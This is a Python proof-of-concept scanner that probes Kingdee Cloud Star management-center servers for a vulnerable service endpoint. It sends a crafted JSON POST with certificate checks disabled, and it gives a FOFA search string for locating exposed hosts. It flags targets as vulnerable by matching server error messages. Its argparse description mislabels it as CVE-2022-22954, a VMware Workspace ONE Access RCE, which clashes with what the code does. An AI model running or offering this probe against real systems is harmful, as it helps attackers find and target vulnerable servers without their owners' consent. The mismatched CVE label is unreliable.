#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="金蝶云星空-管理中心""')
    print('+          参考链接：https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502')


def run_proto(url):
    requests.packages.urllib3.disable_warnings()
    path = [
        '/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc'
            ]
    for i in path:
        check_url = url + i
        headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Content-Type': 'text/json',
        }
        data = '''{"ap0":"asdas","format":"3"}'''
        try:
            response = requests.post(url=check_url, data=data, headers=headers, timeout=(6, 6), allow_redirects=True, verify=False)
            if '发生时间' in response.text and '错误编号' in response.text and '参数产生异常' in response.text and response.status_code == 200:
                print('{} is sExist'.format(url))
                print(response.text)
                return True
            else:
                return False

        except Exception as e:
            print(url + 'isnot')
            print(e)
            continue
    print(url + 'isnot')
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser(description="CVE-2022-22954_VMware Workspace ONE Access RCE")
    parser.add_argument('-t', '--target', type=str, help='127.0.0.1:80', default='127.0.0.1:80')
    args = parser.parse_args()
    target = args.target

    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')